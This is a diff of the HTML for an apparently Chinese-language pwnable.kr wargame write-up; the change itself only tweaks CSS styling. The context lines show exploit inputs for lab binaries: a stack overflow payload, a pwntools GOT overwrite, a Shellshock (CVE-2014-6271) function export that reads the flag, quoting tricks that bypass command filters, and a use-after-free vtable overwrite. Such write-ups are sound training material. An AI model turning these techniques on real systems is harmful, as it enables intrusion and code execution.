@@ -45,13 +45,13 @@
 <p>fd == 2 为标准错误输出</p>
 </blockquote>
 <p>将 <code>argv[1]</code> 减去 4660，read(fd)，然后比较字符串：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>⋊&gt; ~/p/1_fd ./fd <span style="color:#ae81ff">4660</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>⋊&gt; ~/p/1_fd ./fd <span style="color:#ae81ff">4660</span>
 </span></span><span style="display:flex;"><span>LETMEWIN
 </span></span><span style="display:flex;"><span>good job :<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>/bin/cat: flag: No such file or directory
 </span></span></code></pre></div><h2 id="2-collision">2. collision</h2>
 <p>IDA F5 给出的代码很清晰，输入 5 个数，和为 0x21DD09EC：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.data:<span style="color:#ae81ff">0804</span>A020                 public hashcode
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.data:<span style="color:#ae81ff">0804</span>A020                 public hashcode
 </span></span><span style="display:flex;"><span>.data:<span style="color:#ae81ff">0804</span>A020 hashcode        dd <span style="color:#ae81ff">21</span>DD09ECh            ; DATA XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">97</span>r
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(argv[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">20</span> )
@@ -65,8 +65,8 @@
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">check_password</span>(<span style="color:#66d9ef">int</span> a1)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [sp+4h] [bp-Ch]@1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [sp+8h] [bp-8h]@1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [sp+8h] [bp-8h]@1
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span>; <span style="color:#f92672">++</span>i )
 </span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">+=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> i);
@@ -84,7 +84,7 @@
 </code></pre><p>func 函数经典栈溢出，覆盖参数：”A” * (0x2C + 0x8) + pack(0x0CAFEBABE)</p>
 <h2 id="4-flag">4. flag</h2>
 <p><code>upx -d flag</code> 脱掉壳，strings 就可以看到 flag：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>⋊&gt; /tmp strings flag |grep -i upx
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>⋊&gt; /tmp strings flag |grep -i upx
 </span></span><span style="display:flex;"><span>UPX...? sounds like a delivery service :<span style="color:#f92672">)</span>
 </span></span></code></pre></div><h2 id="5-passcode">5. passcode</h2>
 <p><code>scanf</code> 未使用 <code>&amp;</code> 传递指针，而是直接传递了变量，变量 <code>passcode1</code> 未初始化，导致函数 <code>welcome</code> 中的变量 <code>name (ebp-70h)</code> 最后 4 字节刚好可以覆盖 <code>passcode1 (ebp-10h)</code>，造成任意地址的 4 字节写。</p>
@@ -111,7 +111,7 @@
 .text:0804859D                 mov     [esp], eax      ; format
 .text:080485A0                 call    _printf
 </code></pre><p>覆写 <code>printf@got.plt</code> 为 login ok 部分，改变程序流程：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>⋊&gt; ~/p/5_passcode python -c <span style="color:#e6db74">&#39;from pwn import *; print &#34;A&#34;*96+pack(0x804a000)+&#34;134514135&#34;&#39;</span> |./passcode
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>⋊&gt; ~/p/5_passcode python -c <span style="color:#e6db74">&#39;from pwn import *; print &#34;A&#34;*96+pack(0x804a000)+&#34;134514135&#34;&#39;</span> |./passcode
 </span></span><span style="display:flex;"><span>Toddler<span style="color:#960050;background-color:#1e0010">&#39;</span>s Secure Login System 1.0 beta.
 </span></span><span style="display:flex;"><span>enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
 </span></span><span style="display:flex;"><span>enter passcode1 : Login OK!
@@ -144,7 +144,7 @@ Congratz!
 My daddy has a lot of ARMv5te muscle!
 </code></pre><h2 id="9-mistake">9. mistake</h2>
 <p>误用了 C 函数 open 的 mode 参数，在存在 mode 参数时，open 的返回值为：若所有欲核查的权限都通过了检查则返回 0 值, 表示成功, 只要有一个权限被禁止则返回 -1。所以 fd == 0，导致 pw_buf 从标准输入读入，在 IDA Pesudocode 中可以很清晰的看到：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">10uLL</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">10uLL</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;input password : &#34;</span>, <span style="color:#f92672">&amp;</span>buf);
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%10s&#34;</span>, <span style="color:#f92672">&amp;</span>s2);
@@ -156,7 +156,7 @@ My daddy has a lot of ARMv5te muscle!
 </span></span><span style="display:flex;"><span>  }
 </span></span></code></pre></div><h2 id="10-shellshock">10. shellshock</h2>
 <p>shellshock 漏洞：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>shellshock@ubuntu:~$ ./bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>shellshock@ubuntu:~$ ./bash
 </span></span><span style="display:flex;"><span>shellshock@ubuntu:~$ export echo<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;() { cat flag; }&#34;</span>
 </span></span><span style="display:flex;"><span>shellshock@ubuntu:~$ ./shellshock
 </span></span><span style="display:flex;"><span>only <span style="color:#66d9ef">if</span> I knew CVE-2014-6271 ten years ago..!!
@@ -168,11 +168,11 @@ My daddy has a lot of ARMv5te muscle!
 <p>TODO</p>
 <h2 id="14-cmd1">14. cmd1</h2>
 <p>shell 拼接字符串简单绕过：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cmd1@ubuntu:~$ ./cmd1 <span style="color:#e6db74">&#34;/bin/cat &#39;fl&#39;&#39;ag&#39;&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cmd1@ubuntu:~$ ./cmd1 <span style="color:#e6db74">&#34;/bin/cat &#39;fl&#39;&#39;ag&#39;&#34;</span>
 </span></span><span style="display:flex;"><span>mommy now I get what PATH environment is <span style="color:#66d9ef">for</span> :<span style="color:#f92672">)</span>
 </span></span></code></pre></div><h2 id="15-cmd2">15. cmd2</h2>
 <p>这题比上面的难了些，过滤了很多，通过 echo 的编码/转义搞定。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ <span style="color:#75715e">#shell ascii</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ <span style="color:#75715e">#shell ascii</span>
 </span></span><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;\0101&#39;</span>
 </span></span><span style="display:flex;"><span>A
 </span></span><span style="display:flex;"><span>⋊&gt; ~ ipython
@@ -189,7 +189,7 @@ My daddy has a lot of ARMv5te muscle!
 </span></span></code></pre></div><h2 id="16-uaf">16. uaf</h2>
 <p>典型的 UAF 漏洞，注意：先 free man，再 free woman，alloc 时会先获取到 woman 的空间，然后才是 man 空间，所以应该两次 alloc。</p>
 <p>通过覆写虚表指针为虚表指针 - 8 获取 shell。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>⋊&gt; /tmp ipython
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>⋊&gt; /tmp ipython
 </span></span><span style="display:flex;"><span>In <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: from pwn import *
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>In <span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>: pack<span style="color:#f92672">(</span>0x401568<span style="color:#f92672">)</span>
